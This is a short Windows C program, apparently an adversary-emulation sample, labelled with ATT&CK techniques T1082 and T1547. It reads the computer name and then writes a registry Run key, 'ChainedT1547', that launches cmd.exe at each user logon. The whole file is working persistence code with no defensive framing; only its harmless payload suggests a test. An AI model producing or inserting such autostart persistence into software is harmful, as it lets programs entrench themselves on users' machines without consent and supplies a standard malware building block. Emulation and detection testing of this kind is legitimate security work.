/* Discovery + Persistence: T1082 (System Info) + T1547 (Run Keys) */
#include <windows.h>
#include <string.h>

int main(void) {
    char name[256] = { 0 };
    DWORD len = 256;
    GetComputerNameA(name, &len);
    HKEY hKey = NULL;
    if (RegOpenKeyExA(HKEY_CURRENT_USER, "Software\\Microsoft\\Windows\\CurrentVersion\\Run", 0, KEY_SET_VALUE, &hKey) == ERROR_SUCCESS) {
        RegSetValueExA(hKey, "ChainedT1547", 0, REG_SZ, (const BYTE *)"cmd.exe", 8);
        RegCloseKey(hKey);
    }
    return 0;
}
